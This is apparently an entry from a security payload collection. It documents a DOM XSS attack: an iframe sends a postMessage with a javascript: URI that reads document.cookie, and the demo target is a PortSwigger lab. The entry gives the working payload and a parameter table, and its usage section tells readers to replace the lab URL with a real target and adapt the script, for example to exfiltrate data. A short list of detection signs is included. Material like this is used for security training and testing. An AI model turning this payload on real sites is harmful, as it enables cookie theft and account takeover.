---
id: eaa67000-7e03-48ee-8ae7-76a199c32d94
type: code
language: html
verified: true
created_at: '2020-08-31T14:35:36.740857+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - DOM XSS
  - payload
  - postMessage
validated: true
---

# Iframe-PostMessage-DOM-XSS-Payload

## Code

```html
<iframe src=https://ac831fff1e627a4780714f27008a000c.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>
```

## Description

This HTML code snippet creates an iframe that loads a target vulnerable web page and, upon loading, sends a malicious postMessage to the iframe's content window. The message is a JSON string with a 'type' field set to 'load channel' and a 'url' field containing a 'javascript:' URI that executes alert(document.cookie) when parsed and processed by the target's unsafe JSON.parse handler, leading to DOM XSS.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| src URL | The URL of the vulnerable target application | https://example.com/vulnerable-page |
| payload in url | The JavaScript code to inject via javascript: URI | javascript:alert(document.cookie) |

## Usage

This payload is used in DOM XSS exploitation scenarios where the target uses postMessage for cross-origin communication but fails to validate JSON inputs. Save as an HTML file and open in a browser, or inject via developer tools. It targets applications mimicking the structure in OWASP or PortSwigger labs. Substitute the src URL with the actual target and customize the injected JavaScript for different impacts, such as data exfiltration.

## Detection

- Browser developer tools showing anomalous postMessage events with malformed JSON.
- CSP violations or WAF logs detecting 'javascript:' schemes in message data.
- JavaScript errors from failed JSON.parse on invalid structures.
- Monitoring for unexpected alert() calls or cookie access in client-side logs.

## Related

- [[procedures/DOM-XSS-Using-Web-Messages-and-JSON-parse]]
